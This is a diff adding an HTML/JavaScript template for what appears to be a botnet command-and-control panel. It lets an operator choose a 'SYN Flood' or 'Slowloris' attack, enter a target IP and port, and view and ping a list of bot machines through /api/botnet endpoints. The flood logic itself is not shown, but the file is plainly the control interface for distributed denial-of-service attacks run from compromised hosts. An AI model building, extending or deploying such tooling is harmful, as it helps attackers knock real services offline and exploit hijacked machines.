@@ -1,0 +1,134 @@
+{% extends "templates.html" %} {%block title%}Master Page{% endblock %} {%block
+content%}
+<div class="content">
+	<div class="content-header">
+		<select
+			name="mode"
+			class="ip-display"
+			style="font-size: medium"
+			id="mode"
+		>
+			<option value="syn">SYN Flood</option>
+			<option value="lor">Slowloris</option>
+		</select>
+		<input
+			type="text"
+			class="ip-display"
+			style="font-size: medium"
+			id="target-ip"
+			placeholder="Target IP Address:port"
+		/>
+		<div class="attack-button">
+			<div class="text">Ausführung</div>
+		</div>
+	</div>
+	<hr />
+	<div
+		class="list-container"
+		id="bot-container"
+	></div>
+</div>
+<script src="{{ url_for('static',filename='js/jquery.min.js') }}"></script>
+<script>
+	$(document).ready(() => {
+		console.log("page loaded");
+		const refreshBot = (e) => {
+			let uid = e.currentTarget.id;
+			console.log(uid);
+			statusRefresh(uid);
+		};
+		const statusRefresh = (uid) => {
+			$(`#state_${uid}`).removeClass("online");
+			$(`#state_${uid}`).text("refreshing . .");
+			$(`#state_${uid}`).addClass("offline");
+			$.ajax({
+				type: "POST",
+				url: "/api/botnet/ping",
+				data: {
+					uid: `${uid}`,
+				},
+				success: (res) => {
+					console.log(res);
+					$(`#state_${uid}`).text(res.state);
+					if (res.state == "online") {
+						$(`#state_${uid}`).addClass("online");
+						$(`#state_${uid}`).removeClass("offline");
+					} else {
+						$(`#state_${uid}`).addClass("offline");
+					}
+				},
+				error: (xhr, status, error) => {
+					console.error(`Error occurred for ${ip}:${port}: ${error}`);
+				},
+			});
+		};
+		const getStatus = () => {
+			let dataCollection = [];
+			$('input[name="dta"]').each(function () {
+				let value = $(this).val();
+				dataCollection.push(value);
+			});
+			console.log(dataCollection);
+			for (let i = 0; i < dataCollection.length; i++) {
+				let data = dataCollection[i];
+				console.log(data);
+				$.ajax({
+					type: "POST",
+					url: "/api/botnet/ping",
+					data: {
+						uid: `${data}`,
+					},
+					success: (res) => {
+						console.log(res);
+						$(`#state_${data}`).text(res.state);
+						if (res.state == "online") {
+							$(`#state_${data}`).addClass("online");
+							$(`#state_${data}`).removeClass("offline");
+						}
+					},
+					error: (xhr, status, error) => {
+						console.error(`Error occurred for ${ip}:${port}: ${error}`);
+					},
+				});
+			}
+		};
+
+		$.ajax({
+			type: "POST",
+			url: "/api/botnet/get",
+			success: (res) => {
+				res.map((bot) => {
+					$("#bot-container").append(
+						`
+					<div class="list-items">
+				<div class="left">
+					<input
+						type="checkbox"
+						name="selected"
+						class="check"
+						value="${bot.id}"
+					/>
+					<input name="dta" value="${bot.identifier}" type="hidden"/>
+					<div class="machine-name">${bot.identifier}</div>
+					<div class="bot-ip">${bot.ip}</div>
+				</div>
+				<div class="button-refresh cursor-pointer" id="${bot.identifier}">Refresh</div>
+				<div class="status offline" id="state_${bot.identifier}"></div>
+			</div>
+					`
+					);
+				});
+				getStatus();
+				console.log(res);
+			},
+			error: (res) => {
+				console.log(res);
+			},
+		});
+		$(document).on("click", ".button-refresh", (e) => {
+			refreshBot(e);
+		});
+	});
+</script>
+<script></script>
+{% endblock %}
